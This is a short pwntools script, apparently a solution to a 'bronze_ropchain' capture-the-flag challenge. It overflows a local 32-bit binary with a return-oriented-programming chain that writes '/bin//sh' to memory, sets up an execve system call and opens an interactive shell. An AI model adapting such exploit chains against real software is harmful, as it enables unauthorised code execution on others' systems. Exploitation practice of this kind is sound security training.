from pwn import *
from struct import pack

e = ELF('./bronze_ropchain')
r = process('./bronze_ropchain')

# Padding goes here
p = 'A'*28

#p += pack('<I', 0x0806ef2b) # pop edx ; ret
#p += pack('<I', 0x080da060) # @ .data
#p += pack('<I', 0x080a8e86) # pop eax ; ret
## pop eax ; pop edx ; pop ebx ; ret ;
p += pack('<I', 0x080564b4)
p += '/bin'
p += pack('<I', 0x080da060)
p += 'AAAA'
p += pack('<I', 0x08056fe5) # mov dword ptr [edx], eax ; ret
#p += pack('<I', 0x0806ef2b) # pop edx ; ret
#p += pack('<I', 0x080da064) # @ .data + 4
#p += pack('<I', 0x080a8e86) # pop eax ; ret
p += pack('<I', 0x080564b4)
p += '//sh'
p += pack('<I', 0x080da064)
p += 'AAAA'
p += pack('<I', 0x08056fe5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ef2b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080565a0) # xor eax, eax ; ret
p += pack('<I', 0x08056fe5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ef52) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ef2b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080565a0) # xor eax, eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x0807c3ba) # inc eax ; ret
p += pack('<I', 0x080495b3) # int 0x80

print r.recvuntil('name?\n')
r.sendline(p)
print r.recvuntil('day?\n')
r.sendline('')
r.sendline('/bin/sh')
r.interactive()